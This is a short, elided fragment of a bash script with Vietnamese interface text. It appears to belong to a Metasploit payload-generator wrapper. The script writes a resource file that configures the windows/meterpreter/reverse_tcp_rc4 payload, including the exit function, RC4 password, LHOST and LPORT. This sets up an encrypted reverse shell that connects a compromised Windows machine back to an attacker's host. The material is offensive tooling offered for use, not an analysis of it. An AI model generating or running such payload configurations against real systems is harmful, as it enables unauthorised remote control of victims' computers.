...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp_rc4):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_tcp_rc4" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set RC4PASSWORD $rc4password" >> $rc_file
	paylo="windows/meterpreter/reverse_tcp_rc4"
	lhost=$lhost
	lport=$lport
}
